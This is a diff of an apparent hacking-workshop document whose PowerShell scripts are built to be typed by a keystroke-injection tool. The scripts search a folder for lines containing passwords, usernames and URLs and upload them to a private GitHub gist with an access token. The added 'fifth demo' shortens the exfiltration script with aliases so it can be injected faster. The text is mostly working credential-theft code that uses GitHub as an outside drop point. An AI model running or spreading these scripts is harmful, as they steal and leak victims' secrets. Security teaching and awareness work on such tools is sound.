@@ -123,16 +123,26 @@ We want to generate a bit less attention so we will try to have less lines of co
 Luckily, we can do this by using “;” in powershell
 Create new-github4.ps1
 
-Remark: This is actually some foreshadowing. This workshop is all about using a virtual keyboard to send malicious commands as fast as possible, using our little hacking tool. So we want to be fast, using less code to make it all more robust.
+Remark: This is actually some foreshadowing. This workshop is all about using a virtual keyboard to send malicious commands as fast as possible, using our little hacking tool. So we want to be fast, using less characters to make it all more robust.
 
 new-github4.ps1
 ```powershell
 . .\logindata.ps1
-$c = Get-ChildItem C:\temp -Recurse -File | Select-String 'dog|cat|pets' | ForEach-Object { "$($_.Path): $($_.Line)" } | Out-String
-$body = @{description="Github fourth demo"; public=$false; files=@{"secrets.txt"=@{content=$c}}} | ConvertTo-Json -Depth 4
-Invoke-WebRequest -Uri "https://api.github.com/gists" -Method POST -Headers @{Authorization="Bearer $FGPAT"; "X-GitHub-Api-Version"="2022-11-28"} -Body $body -ContentType "application/json"
+$c = Get-ChildItem C:\temp\test -Recurse | Select-String 'password|username|http' | ForEach-Object { "$($_.Path): $($_.Line)" } | Out-String
+$body = @{description="Github fourth demo"; public=$false; files=@{"secrets.txt"=@{content=$c}}} | ConvertTo-Json
+Invoke-WebRequest -Uri "https://api.github.com/gists" -Method POST -Headers @{Authorization="Bearer $FGPAT"
+"X-GitHub-Api-Version"="2022-11-28"} -Body $body -ContentType "application/json"
 
 ```
 
-Observe the concatenation done in those 2 files.
+# Github fifth demo
 
+But what if, we try to optimize our character length a BIT more (by making it a BIT less)?
+
+new-github5.ps1
+```powershell
+$FGPAT     =   "github_pat_STRINGHERE"
+$c = gci C:\temp\test -R | sls 'password|username|http' | % { "$($_.Path): $($_.Line)" } | Out-String
+$body = @{description="Github 5th demo"; public=$false; files=@{"secrets.txt"=@{content=$c}}} | ConvertTo-Json
+iwr -Uri "https://api.github.com/gists" -Me POST -H @{Authorization="Bearer $FGPAT"} -B $body -Co "application/json"
+```
